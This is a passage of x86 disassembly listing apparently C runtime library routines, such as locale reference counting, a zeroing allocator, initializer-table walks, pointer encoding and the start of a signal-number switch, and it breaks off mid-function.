  40651e:	8b 86 94 00 00 00    	mov    0x94(%esi),%eax
  406524:	bf 80 00 00 00       	mov    $0x80,%edi
  406529:	2b c7                	sub    %edi,%eax
  40652b:	50                   	push   %eax
  40652c:	e8 dc d8 ff ff       	call   0x403e0d
  406531:	8b 86 98 00 00 00    	mov    0x98(%esi),%eax
  406537:	2b c7                	sub    %edi,%eax
  406539:	50                   	push   %eax
  40653a:	e8 ce d8 ff ff       	call   0x403e0d
  40653f:	ff b6 8c 00 00 00    	push   0x8c(%esi)
  406545:	e8 c3 d8 ff ff       	call   0x403e0d
  40654a:	83 c4 10             	add    $0x10,%esp
  40654d:	ff b6 9c 00 00 00    	push   0x9c(%esi)
  406553:	e8 97 00 00 00       	call   0x4065ef
  406558:	59                   	pop    %ecx
  406559:	6a 06                	push   $0x6
  40655b:	58                   	pop    %eax
  40655c:	8d 9e a0 00 00 00    	lea    0xa0(%esi),%ebx
  406562:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406565:	8d 7e 28             	lea    0x28(%esi),%edi
  406568:	81 7f f8 38 36 41 00 	cmpl   $0x413638,-0x8(%edi)
  40656f:	74 1d                	je     0x40658e
  406571:	8b 07                	mov    (%edi),%eax
  406573:	85 c0                	test   %eax,%eax
  406575:	74 14                	je     0x40658b
  406577:	83 38 00             	cmpl   $0x0,(%eax)
  40657a:	75 0f                	jne    0x40658b
  40657c:	50                   	push   %eax
  40657d:	e8 8b d8 ff ff       	call   0x403e0d
  406582:	ff 33                	push   (%ebx)
  406584:	e8 84 d8 ff ff       	call   0x403e0d
  406589:	59                   	pop    %ecx
  40658a:	59                   	pop    %ecx
  40658b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40658e:	83 7f f4 00          	cmpl   $0x0,-0xc(%edi)
  406592:	74 16                	je     0x4065aa
  406594:	8b 47 fc             	mov    -0x4(%edi),%eax
  406597:	85 c0                	test   %eax,%eax
  406599:	74 0c                	je     0x4065a7
  40659b:	83 38 00             	cmpl   $0x0,(%eax)
  40659e:	75 07                	jne    0x4065a7
  4065a0:	50                   	push   %eax
  4065a1:	e8 67 d8 ff ff       	call   0x403e0d
  4065a6:	59                   	pop    %ecx
  4065a7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065aa:	83 c3 04             	add    $0x4,%ebx
  4065ad:	83 c7 10             	add    $0x10,%edi
  4065b0:	83 e8 01             	sub    $0x1,%eax
  4065b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4065b6:	75 b0                	jne    0x406568
  4065b8:	56                   	push   %esi
  4065b9:	e8 4f d8 ff ff       	call   0x403e0d
  4065be:	59                   	pop    %ecx
  4065bf:	5f                   	pop    %edi
  4065c0:	5e                   	pop    %esi
  4065c1:	5b                   	pop    %ebx
  4065c2:	8b e5                	mov    %ebp,%esp
  4065c4:	5d                   	pop    %ebp
  4065c5:	c3                   	ret
  4065c6:	8b ff                	mov    %edi,%edi
  4065c8:	55                   	push   %ebp
  4065c9:	8b ec                	mov    %esp,%ebp
  4065cb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4065ce:	85 c9                	test   %ecx,%ecx
  4065d0:	74 16                	je     0x4065e8
  4065d2:	81 f9 90 db 40 00    	cmp    $0x40db90,%ecx
  4065d8:	74 0e                	je     0x4065e8
  4065da:	33 c0                	xor    %eax,%eax
  4065dc:	40                   	inc    %eax
  4065dd:	f0 0f c1 81 b0 00 00 	lock xadd %eax,0xb0(%ecx)
  4065e4:	00 
  4065e5:	40                   	inc    %eax
  4065e6:	5d                   	pop    %ebp
  4065e7:	c3                   	ret
  4065e8:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4065ed:	5d                   	pop    %ebp
  4065ee:	c3                   	ret
  4065ef:	8b ff                	mov    %edi,%edi
  4065f1:	55                   	push   %ebp
  4065f2:	8b ec                	mov    %esp,%ebp
  4065f4:	56                   	push   %esi
  4065f5:	8b 75 08             	mov    0x8(%ebp),%esi
  4065f8:	85 f6                	test   %esi,%esi
  4065fa:	74 20                	je     0x40661c
  4065fc:	81 fe 90 db 40 00    	cmp    $0x40db90,%esi
  406602:	74 18                	je     0x40661c
  406604:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  40660a:	85 c0                	test   %eax,%eax
  40660c:	75 0e                	jne    0x40661c
  40660e:	56                   	push   %esi
  40660f:	e8 85 fb ff ff       	call   0x406199
  406614:	56                   	push   %esi
  406615:	e8 f3 d7 ff ff       	call   0x403e0d
  40661a:	59                   	pop    %ecx
  40661b:	59                   	pop    %ecx
  40661c:	5e                   	pop    %esi
  40661d:	5d                   	pop    %ebp
  40661e:	c3                   	ret
  40661f:	8b ff                	mov    %edi,%edi
  406621:	55                   	push   %ebp
  406622:	8b ec                	mov    %esp,%ebp
  406624:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406627:	85 c9                	test   %ecx,%ecx
  406629:	74 16                	je     0x406641
  40662b:	81 f9 90 db 40 00    	cmp    $0x40db90,%ecx
  406631:	74 0e                	je     0x406641
  406633:	83 c8 ff             	or     $0xffffffff,%eax
  406636:	f0 0f c1 81 b0 00 00 	lock xadd %eax,0xb0(%ecx)
  40663d:	00 
  40663e:	48                   	dec    %eax
  40663f:	5d                   	pop    %ebp
  406640:	c3                   	ret
  406641:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  406646:	5d                   	pop    %ebp
  406647:	c3                   	ret
  406648:	8b ff                	mov    %edi,%edi
  40664a:	55                   	push   %ebp
  40664b:	8b ec                	mov    %esp,%ebp
  40664d:	8b 45 08             	mov    0x8(%ebp),%eax
  406650:	85 c0                	test   %eax,%eax
  406652:	74 73                	je     0x4066c7
  406654:	f0 ff 48 0c          	lock decl 0xc(%eax)
  406658:	8b 48 7c             	mov    0x7c(%eax),%ecx
  40665b:	85 c9                	test   %ecx,%ecx
  40665d:	74 03                	je     0x406662
  40665f:	f0 ff 09             	lock decl (%ecx)
  406662:	8b 88 84 00 00 00    	mov    0x84(%eax),%ecx
  406668:	85 c9                	test   %ecx,%ecx
  40666a:	74 03                	je     0x40666f
  40666c:	f0 ff 09             	lock decl (%ecx)
  40666f:	8b 88 80 00 00 00    	mov    0x80(%eax),%ecx
  406675:	85 c9                	test   %ecx,%ecx
  406677:	74 03                	je     0x40667c
  406679:	f0 ff 09             	lock decl (%ecx)
  40667c:	8b 88 8c 00 00 00    	mov    0x8c(%eax),%ecx
  406682:	85 c9                	test   %ecx,%ecx
  406684:	74 03                	je     0x406689
  406686:	f0 ff 09             	lock decl (%ecx)
  406689:	56                   	push   %esi
  40668a:	6a 06                	push   $0x6
  40668c:	8d 48 28             	lea    0x28(%eax),%ecx
  40668f:	5e                   	pop    %esi
  406690:	81 79 f8 38 36 41 00 	cmpl   $0x413638,-0x8(%ecx)
  406697:	74 09                	je     0x4066a2
  406699:	8b 11                	mov    (%ecx),%edx
  40669b:	85 d2                	test   %edx,%edx
  40669d:	74 03                	je     0x4066a2
  40669f:	f0 ff 0a             	lock decl (%edx)
  4066a2:	83 79 f4 00          	cmpl   $0x0,-0xc(%ecx)
  4066a6:	74 0a                	je     0x4066b2
  4066a8:	8b 51 fc             	mov    -0x4(%ecx),%edx
  4066ab:	85 d2                	test   %edx,%edx
  4066ad:	74 03                	je     0x4066b2
  4066af:	f0 ff 0a             	lock decl (%edx)
  4066b2:	83 c1 10             	add    $0x10,%ecx
  4066b5:	83 ee 01             	sub    $0x1,%esi
  4066b8:	75 d6                	jne    0x406690
  4066ba:	ff b0 9c 00 00 00    	push   0x9c(%eax)
  4066c0:	e8 5a ff ff ff       	call   0x40661f
  4066c5:	59                   	pop    %ecx
  4066c6:	5e                   	pop    %esi
  4066c7:	5d                   	pop    %ebp
  4066c8:	c3                   	ret
  4066c9:	6a 0c                	push   $0xc
  4066cb:	68 c8 18 41 00       	push   $0x4118c8
  4066d0:	e8 3b ba ff ff       	call   0x402110
  4066d5:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4066d9:	e8 4c dc ff ff       	call   0x40432a
  4066de:	8b f8                	mov    %eax,%edi
  4066e0:	8b 0d 98 36 41 00    	mov    0x413698,%ecx
  4066e6:	85 8f 50 03 00 00    	test   %ecx,0x350(%edi)
  4066ec:	74 07                	je     0x4066f5
  4066ee:	8b 77 4c             	mov    0x4c(%edi),%esi
  4066f1:	85 f6                	test   %esi,%esi
  4066f3:	75 43                	jne    0x406738
  4066f5:	6a 04                	push   $0x4
  4066f7:	e8 64 ef ff ff       	call   0x405660
  4066fc:	59                   	pop    %ecx
  4066fd:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406701:	ff 35 54 42 41 00    	push   0x414254
  406707:	8d 47 4c             	lea    0x4c(%edi),%eax
  40670a:	50                   	push   %eax
  40670b:	e8 30 00 00 00       	call   0x406740
  406710:	59                   	pop    %ecx
  406711:	59                   	pop    %ecx
  406712:	8b f0                	mov    %eax,%esi
  406714:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  406717:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40671e:	e8 0c 00 00 00       	call   0x40672f
  406723:	85 f6                	test   %esi,%esi
  406725:	75 11                	jne    0x406738
  406727:	e8 69 d7 ff ff       	call   0x403e95
  40672c:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40672f:	6a 04                	push   $0x4
  406731:	e8 72 ef ff ff       	call   0x4056a8
  406736:	59                   	pop    %ecx
  406737:	c3                   	ret
  406738:	8b c6                	mov    %esi,%eax
  40673a:	e8 17 ba ff ff       	call   0x402156
  40673f:	c3                   	ret
  406740:	8b ff                	mov    %edi,%edi
  406742:	55                   	push   %ebp
  406743:	8b ec                	mov    %esp,%ebp
  406745:	56                   	push   %esi
  406746:	8b 75 0c             	mov    0xc(%ebp),%esi
  406749:	57                   	push   %edi
  40674a:	85 f6                	test   %esi,%esi
  40674c:	74 3c                	je     0x40678a
  40674e:	8b 45 08             	mov    0x8(%ebp),%eax
  406751:	85 c0                	test   %eax,%eax
  406753:	74 35                	je     0x40678a
  406755:	8b 38                	mov    (%eax),%edi
  406757:	3b fe                	cmp    %esi,%edi
  406759:	75 04                	jne    0x40675f
  40675b:	8b c6                	mov    %esi,%eax
  40675d:	eb 2d                	jmp    0x40678c
  40675f:	56                   	push   %esi
  406760:	89 30                	mov    %esi,(%eax)
  406762:	e8 98 fc ff ff       	call   0x4063ff
  406767:	59                   	pop    %ecx
  406768:	85 ff                	test   %edi,%edi
  40676a:	74 ef                	je     0x40675b
  40676c:	57                   	push   %edi
  40676d:	e8 d6 fe ff ff       	call   0x406648
  406772:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  406776:	59                   	pop    %ecx
  406777:	75 e2                	jne    0x40675b
  406779:	81 ff 78 35 41 00    	cmp    $0x413578,%edi
  40677f:	74 da                	je     0x40675b
  406781:	57                   	push   %edi
  406782:	e8 f5 fc ff ff       	call   0x40647c
  406787:	59                   	pop    %ecx
  406788:	eb d1                	jmp    0x40675b
  40678a:	33 c0                	xor    %eax,%eax
  40678c:	5f                   	pop    %edi
  40678d:	5e                   	pop    %esi
  40678e:	5d                   	pop    %ebp
  40678f:	c3                   	ret
  406790:	8b ff                	mov    %edi,%edi
  406792:	55                   	push   %ebp
  406793:	8b ec                	mov    %esp,%ebp
  406795:	5d                   	pop    %ebp
  406796:	e9 00 00 00 00       	jmp    0x40679b
  40679b:	8b ff                	mov    %edi,%edi
  40679d:	55                   	push   %ebp
  40679e:	8b ec                	mov    %esp,%ebp
  4067a0:	56                   	push   %esi
  4067a1:	8b 75 0c             	mov    0xc(%ebp),%esi
  4067a4:	85 f6                	test   %esi,%esi
  4067a6:	74 1b                	je     0x4067c3
  4067a8:	6a e0                	push   $0xffffffe0
  4067aa:	33 d2                	xor    %edx,%edx
  4067ac:	58                   	pop    %eax
  4067ad:	f7 f6                	div    %esi
  4067af:	3b 45 10             	cmp    0x10(%ebp),%eax
  4067b2:	73 0f                	jae    0x4067c3
  4067b4:	e8 82 e0 ff ff       	call   0x40483b
  4067b9:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  4067bf:	33 c0                	xor    %eax,%eax
  4067c1:	eb 42                	jmp    0x406805
  4067c3:	53                   	push   %ebx
  4067c4:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4067c7:	57                   	push   %edi
  4067c8:	85 db                	test   %ebx,%ebx
  4067ca:	74 0b                	je     0x4067d7
  4067cc:	53                   	push   %ebx
  4067cd:	e8 8d 14 00 00       	call   0x407c5f
  4067d2:	59                   	pop    %ecx
  4067d3:	8b f8                	mov    %eax,%edi
  4067d5:	eb 02                	jmp    0x4067d9
  4067d7:	33 ff                	xor    %edi,%edi
  4067d9:	0f af 75 10          	imul   0x10(%ebp),%esi
  4067dd:	56                   	push   %esi
  4067de:	53                   	push   %ebx
  4067df:	e8 ae 14 00 00       	call   0x407c92
  4067e4:	8b d8                	mov    %eax,%ebx
  4067e6:	59                   	pop    %ecx
  4067e7:	59                   	pop    %ecx
  4067e8:	85 db                	test   %ebx,%ebx
  4067ea:	74 15                	je     0x406801
  4067ec:	3b fe                	cmp    %esi,%edi
  4067ee:	73 11                	jae    0x406801
  4067f0:	2b f7                	sub    %edi,%esi
  4067f2:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  4067f5:	56                   	push   %esi
  4067f6:	6a 00                	push   $0x0
  4067f8:	50                   	push   %eax
  4067f9:	e8 12 bd ff ff       	call   0x402510
  4067fe:	83 c4 0c             	add    $0xc,%esp
  406801:	5f                   	pop    %edi
  406802:	8b c3                	mov    %ebx,%eax
  406804:	5b                   	pop    %ebx
  406805:	5e                   	pop    %esi
  406806:	5d                   	pop    %ebp
  406807:	c3                   	ret
  406808:	ff 15 30 c1 40 00    	call   *0x40c130
  40680e:	85 c0                	test   %eax,%eax
  406810:	a3 60 42 41 00       	mov    %eax,0x414260
  406815:	0f 95 c0             	setne  %al
  406818:	c3                   	ret
  406819:	83 25 60 42 41 00 00 	andl   $0x0,0x414260
  406820:	b0 01                	mov    $0x1,%al
  406822:	c3                   	ret
  406823:	8b ff                	mov    %edi,%edi
  406825:	55                   	push   %ebp
  406826:	8b ec                	mov    %esp,%ebp
  406828:	51                   	push   %ecx
  406829:	a1 04 30 41 00       	mov    0x413004,%eax
  40682e:	33 c5                	xor    %ebp,%eax
  406830:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406833:	57                   	push   %edi
  406834:	8b 7d 08             	mov    0x8(%ebp),%edi
  406837:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  40683a:	75 04                	jne    0x406840
  40683c:	b0 01                	mov    $0x1,%al
  40683e:	eb 57                	jmp    0x406897
  406840:	56                   	push   %esi
  406841:	8b f7                	mov    %edi,%esi
  406843:	53                   	push   %ebx
  406844:	8b 1e                	mov    (%esi),%ebx
  406846:	85 db                	test   %ebx,%ebx
  406848:	74 0e                	je     0x406858
  40684a:	8b cb                	mov    %ebx,%ecx
  40684c:	ff 15 60 c1 40 00    	call   *0x40c160
  406852:	ff d3                	call   *%ebx
  406854:	84 c0                	test   %al,%al
  406856:	74 08                	je     0x406860
  406858:	83 c6 08             	add    $0x8,%esi
  40685b:	3b 75 0c             	cmp    0xc(%ebp),%esi
  40685e:	75 e4                	jne    0x406844
  406860:	3b 75 0c             	cmp    0xc(%ebp),%esi
  406863:	75 04                	jne    0x406869
  406865:	b0 01                	mov    $0x1,%al
  406867:	eb 2c                	jmp    0x406895
  406869:	3b f7                	cmp    %edi,%esi
  40686b:	74 26                	je     0x406893
  40686d:	83 c6 fc             	add    $0xfffffffc,%esi
  406870:	83 7e fc 00          	cmpl   $0x0,-0x4(%esi)
  406874:	74 13                	je     0x406889
  406876:	8b 1e                	mov    (%esi),%ebx
  406878:	85 db                	test   %ebx,%ebx
  40687a:	74 0d                	je     0x406889
  40687c:	6a 00                	push   $0x0
  40687e:	8b cb                	mov    %ebx,%ecx
  406880:	ff 15 60 c1 40 00    	call   *0x40c160
  406886:	ff d3                	call   *%ebx
  406888:	59                   	pop    %ecx
  406889:	83 ee 08             	sub    $0x8,%esi
  40688c:	8d 46 04             	lea    0x4(%esi),%eax
  40688f:	3b c7                	cmp    %edi,%eax
  406891:	75 dd                	jne    0x406870
  406893:	32 c0                	xor    %al,%al
  406895:	5b                   	pop    %ebx
  406896:	5e                   	pop    %esi
  406897:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40689a:	33 cd                	xor    %ebp,%ecx
  40689c:	5f                   	pop    %edi
  40689d:	e8 26 af ff ff       	call   0x4017c8
  4068a2:	8b e5                	mov    %ebp,%esp
  4068a4:	5d                   	pop    %ebp
  4068a5:	c3                   	ret
  4068a6:	8b ff                	mov    %edi,%edi
  4068a8:	55                   	push   %ebp
  4068a9:	8b ec                	mov    %esp,%ebp
  4068ab:	51                   	push   %ecx
  4068ac:	a1 04 30 41 00       	mov    0x413004,%eax
  4068b1:	33 c5                	xor    %ebp,%eax
  4068b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4068b6:	56                   	push   %esi
  4068b7:	8b 75 0c             	mov    0xc(%ebp),%esi
  4068ba:	39 75 08             	cmp    %esi,0x8(%ebp)
  4068bd:	74 23                	je     0x4068e2
  4068bf:	83 c6 fc             	add    $0xfffffffc,%esi
  4068c2:	57                   	push   %edi
  4068c3:	8b 3e                	mov    (%esi),%edi
  4068c5:	85 ff                	test   %edi,%edi
  4068c7:	74 0d                	je     0x4068d6
  4068c9:	6a 00                	push   $0x0
  4068cb:	8b cf                	mov    %edi,%ecx
  4068cd:	ff 15 60 c1 40 00    	call   *0x40c160
  4068d3:	ff d7                	call   *%edi
  4068d5:	59                   	pop    %ecx
  4068d6:	83 ee 08             	sub    $0x8,%esi
  4068d9:	8d 46 04             	lea    0x4(%esi),%eax
  4068dc:	3b 45 08             	cmp    0x8(%ebp),%eax
  4068df:	75 e2                	jne    0x4068c3
  4068e1:	5f                   	pop    %edi
  4068e2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4068e5:	b0 01                	mov    $0x1,%al
  4068e7:	33 cd                	xor    %ebp,%ecx
  4068e9:	5e                   	pop    %esi
  4068ea:	e8 d9 ae ff ff       	call   0x4017c8
  4068ef:	8b e5                	mov    %ebp,%esp
  4068f1:	5d                   	pop    %ebp
  4068f2:	c3                   	ret
  4068f3:	8b ff                	mov    %edi,%edi
  4068f5:	55                   	push   %ebp
  4068f6:	8b ec                	mov    %esp,%ebp
  4068f8:	8d 41 04             	lea    0x4(%ecx),%eax
  4068fb:	8b d0                	mov    %eax,%edx
  4068fd:	2b d1                	sub    %ecx,%edx
  4068ff:	83 c2 03             	add    $0x3,%edx
  406902:	56                   	push   %esi
  406903:	33 f6                	xor    %esi,%esi
  406905:	c1 ea 02             	shr    $0x2,%edx
  406908:	3b c1                	cmp    %ecx,%eax
  40690a:	1b c0                	sbb    %eax,%eax
  40690c:	f7 d0                	not    %eax
  40690e:	23 c2                	and    %edx,%eax
  406910:	74 0d                	je     0x40691f
  406912:	8b 55 08             	mov    0x8(%ebp),%edx
  406915:	46                   	inc    %esi
  406916:	89 11                	mov    %edx,(%ecx)
  406918:	8d 49 04             	lea    0x4(%ecx),%ecx
  40691b:	3b f0                	cmp    %eax,%esi
  40691d:	75 f6                	jne    0x406915
  40691f:	5e                   	pop    %esi
  406920:	5d                   	pop    %ebp
  406921:	c2 04 00             	ret    $0x4
  406924:	8b ff                	mov    %edi,%edi
  406926:	55                   	push   %ebp
  406927:	8b ec                	mov    %esp,%ebp
  406929:	ff 75 08             	push   0x8(%ebp)
  40692c:	b9 64 42 41 00       	mov    $0x414264,%ecx
  406931:	e8 bd ff ff ff       	call   0x4068f3
  406936:	5d                   	pop    %ebp
  406937:	c3                   	ret
  406938:	8b ff                	mov    %edi,%edi
  40693a:	55                   	push   %ebp
  40693b:	8b ec                	mov    %esp,%ebp
  40693d:	51                   	push   %ecx
  40693e:	a1 04 30 41 00       	mov    0x413004,%eax
  406943:	33 c5                	xor    %ebp,%eax
  406945:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406948:	56                   	push   %esi
  406949:	e8 2e 00 00 00       	call   0x40697c
  40694e:	8b f0                	mov    %eax,%esi
  406950:	85 f6                	test   %esi,%esi
  406952:	74 17                	je     0x40696b
  406954:	ff 75 08             	push   0x8(%ebp)
  406957:	8b ce                	mov    %esi,%ecx
  406959:	ff 15 60 c1 40 00    	call   *0x40c160
  40695f:	ff d6                	call   *%esi
  406961:	59                   	pop    %ecx
  406962:	85 c0                	test   %eax,%eax
  406964:	74 05                	je     0x40696b
  406966:	33 c0                	xor    %eax,%eax
  406968:	40                   	inc    %eax
  406969:	eb 02                	jmp    0x40696d
  40696b:	33 c0                	xor    %eax,%eax
  40696d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406970:	33 cd                	xor    %ebp,%ecx
  406972:	5e                   	pop    %esi
  406973:	e8 50 ae ff ff       	call   0x4017c8
  406978:	8b e5                	mov    %ebp,%esp
  40697a:	5d                   	pop    %ebp
  40697b:	c3                   	ret
  40697c:	6a 0c                	push   $0xc
  40697e:	68 e8 18 41 00       	push   $0x4118e8
  406983:	e8 88 b7 ff ff       	call   0x402110
  406988:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40698c:	6a 00                	push   $0x0
  40698e:	e8 cd ec ff ff       	call   0x405660
  406993:	59                   	pop    %ecx
  406994:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406998:	8b 35 04 30 41 00    	mov    0x413004,%esi
  40699e:	8b ce                	mov    %esi,%ecx
  4069a0:	83 e1 1f             	and    $0x1f,%ecx
  4069a3:	33 35 64 42 41 00    	xor    0x414264,%esi
  4069a9:	d3 ce                	ror    %cl,%esi
  4069ab:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4069ae:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4069b5:	e8 0b 00 00 00       	call   0x4069c5
  4069ba:	8b c6                	mov    %esi,%eax
  4069bc:	e8 95 b7 ff ff       	call   0x402156
  4069c1:	c3                   	ret
  4069c2:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4069c5:	6a 00                	push   $0x0
  4069c7:	e8 dc ec ff ff       	call   0x4056a8
  4069cc:	59                   	pop    %ecx
  4069cd:	c3                   	ret
  4069ce:	6a 0c                	push   $0xc
  4069d0:	68 28 19 41 00       	push   $0x411928
  4069d5:	e8 36 b7 ff ff       	call   0x402110
  4069da:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4069de:	8b 45 08             	mov    0x8(%ebp),%eax
  4069e1:	ff 30                	push   (%eax)
  4069e3:	e8 78 ec ff ff       	call   0x405660
  4069e8:	59                   	pop    %ecx
  4069e9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4069ed:	8b 35 04 30 41 00    	mov    0x413004,%esi
  4069f3:	8b ce                	mov    %esi,%ecx
  4069f5:	83 e1 1f             	and    $0x1f,%ecx
  4069f8:	33 35 70 42 41 00    	xor    0x414270,%esi
  4069fe:	d3 ce                	ror    %cl,%esi
  406a00:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  406a03:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406a0a:	e8 0d 00 00 00       	call   0x406a1c
  406a0f:	8b c6                	mov    %esi,%eax
  406a11:	e8 40 b7 ff ff       	call   0x402156
  406a16:	c2 0c 00             	ret    $0xc
  406a19:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  406a1c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  406a1f:	ff 31                	push   (%ecx)
  406a21:	e8 82 ec ff ff       	call   0x4056a8
  406a26:	59                   	pop    %ecx
  406a27:	c3                   	ret
  406a28:	8b ff                	mov    %edi,%edi
  406a2a:	55                   	push   %ebp
  406a2b:	8b ec                	mov    %esp,%ebp
  406a2d:	83 ec 0c             	sub    $0xc,%esp
  406a30:	8b 45 08             	mov    0x8(%ebp),%eax
  406a33:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  406a36:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406a39:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406a3c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406a3f:	50                   	push   %eax
  406a40:	ff 75 0c             	push   0xc(%ebp)
  406a43:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406a46:	50                   	push   %eax
  406a47:	e8 82 ff ff ff       	call   0x4069ce
  406a4c:	8b e5                	mov    %ebp,%esp
  406a4e:	5d                   	pop    %ebp
  406a4f:	c3                   	ret
  406a50:	8b ff                	mov    %edi,%edi
  406a52:	55                   	push   %ebp
  406a53:	8b ec                	mov    %esp,%ebp
  406a55:	8b 45 08             	mov    0x8(%ebp),%eax
  406a58:	48                   	dec    %eax
  406a59:	83 e8 01             	sub    $0x1,%eax
  406a5c:	74 2d                	je     0x406a8b
  406a5e:	83 e8 04             	sub    $0x4,%eax
  406a61:	74 13                	je     0x406a76
  406a63:	83 e8 09             	sub    $0x9,%eax
  406a66:	74 1c                	je     0x406a84
  406a68:	83 e8 06             	sub    $0x6,%eax
  406a6b:	74 10                	je     0x406a7d
  406a6d:	83 e8 01             	sub    $0x1,%eax
  406a70:	74 04                	je     0x406a76
  406a72:	33 c0                	xor    %eax,%eax
  406a74:	5d                   	pop    %ebp
  406a75:	c3                   	ret
  406a76:	b8 70 42 41 00       	mov    $0x414270,%eax
  406a7b:	5d                   	pop    %ebp
  406a7c:	c3                   	ret
  406a7d:	b8 6c 42 41 00       	mov    $0x41426c,%eax
  406a82:	5d                   	pop    %ebp
  406a83:	c3                   	ret
  406a84:	b8 74 42 41 00       	mov    $0x414274,%eax
  406a89:	5d                   	pop    %ebp
  406a8a:	c3                   	ret
  406a8b:	b8 68 42 41 00       	mov    $0x414268,%eax
  406a90:	5d                   	pop    %ebp
  406a91:	c3                   	ret
  406a92:	8b ff                	mov    %edi,%edi
  406a94:	55                   	push   %ebp
  406a95:	8b ec                	mov    %esp,%ebp
  406a97:	6b 0d c0 ca 40 00 0c 	imul   $0xc,0x40cac0,%ecx
  406a9e:	8b 45 0c             	mov    0xc(%ebp),%eax
  406aa1:	03 c8                	add    %eax,%ecx
  406aa3:	3b c1                	cmp    %ecx,%eax
  406aa5:	74 0f                	je     0x406ab6
  406aa7:	8b 55 08             	mov    0x8(%ebp),%edx
  406aaa:	39 50 04             	cmp    %edx,0x4(%eax)
  406aad:	74 09                	je     0x406ab8
  406aaf:	83 c0 0c             	add    $0xc,%eax
  406ab2:	3b c1                	cmp    %ecx,%eax
  406ab4:	75 f4                	jne    0x406aaa
  406ab6:	33 c0                	xor    %eax,%eax
  406ab8:	5d                   	pop    %ebp
  406ab9:	c3                   	ret
  406aba:	8b ff                	mov    %edi,%edi
  406abc:	55                   	push   %ebp
  406abd:	8b ec                	mov    %esp,%ebp
  406abf:	51                   	push   %ecx
  406ac0:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406ac3:	50                   	push   %eax
  406ac4:	6a 03                	push   $0x3
  406ac6:	e8 5d ff ff ff       	call   0x406a28
  406acb:	59                   	pop    %ecx
  406acc:	59                   	pop    %ecx
  406acd:	8b e5                	mov    %ebp,%esp
  406acf:	5d                   	pop    %ebp
  406ad0:	c3                   	ret
  406ad1:	8b ff                	mov    %edi,%edi
  406ad3:	55                   	push   %ebp
  406ad4:	8b ec                	mov    %esp,%ebp
  406ad6:	ff 75 08             	push   0x8(%ebp)
  406ad9:	b9 68 42 41 00       	mov    $0x414268,%ecx
  406ade:	e8 10 fe ff ff       	call   0x4068f3
  406ae3:	ff 75 08             	push   0x8(%ebp)
  406ae6:	b9 6c 42 41 00       	mov    $0x41426c,%ecx
  406aeb:	e8 03 fe ff ff       	call   0x4068f3
  406af0:	ff 75 08             	push   0x8(%ebp)
  406af3:	b9 70 42 41 00       	mov    $0x414270,%ecx
  406af8:	e8 f6 fd ff ff       	call   0x4068f3
  406afd:	ff 75 08             	push   0x8(%ebp)
  406b00:	b9 74 42 41 00       	mov    $0x414274,%ecx
  406b05:	e8 e9 fd ff ff       	call   0x4068f3
  406b0a:	5d                   	pop    %ebp
  406b0b:	c3                   	ret
  406b0c:	e8 19 d8 ff ff       	call   0x40432a
  406b11:	83 c0 08             	add    $0x8,%eax
  406b14:	c3                   	ret
  406b15:	6a 2c                	push   $0x2c
  406b17:	68 08 19 41 00       	push   $0x411908
  406b1c:	e8 8f 3f 00 00       	call   0x40aab0
  406b21:	33 db                	xor    %ebx,%ebx
  406b23:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406b26:	21 5d cc             	and    %ebx,-0x34(%ebp)
  406b29:	b1 01                	mov    $0x1,%cl
  406b2b:	88 4d e3             	mov    %cl,-0x1d(%ebp)
  406b2e:	8b 75 08             	mov    0x8(%ebp),%esi
  406b31:	6a 08                	push   $0x8
  406b33:	5f                   	pop    %edi
  406b34:	3b f7                	cmp    %edi,%esi
  406b36:	7f 18                	jg     0x406b50
  406b38:	74 35                	je     0x406b6f
  406b3a:	8d 46 ff             	lea    -0x1(%esi),%eax
  406b3d:	83 e8 01             	sub    $0x1,%eax
  406b40:	74 22                	je     0x406b64
  406b42:	48                   	dec    %eax
  406b43:	83 e8 01             	sub    $0x1,%eax
  406b46:	74 27                	je     0x406b6f
  406b48:	48                   	dec    %eax
  406b49:	83 e8 01             	sub    $0x1,%eax
  406b4c:	75 4c                	jne    0x406b9a
  406b4e:	eb 14                	jmp    0x406b64
  406b50:	83 fe 0b             	cmp    $0xb,%esi
  406b53:	74 1a                	je     0x406b6f
  406b55:	83 fe 0f             	cmp    $0xf,%esi
  406b58:	74 0a                	je     0x406b64
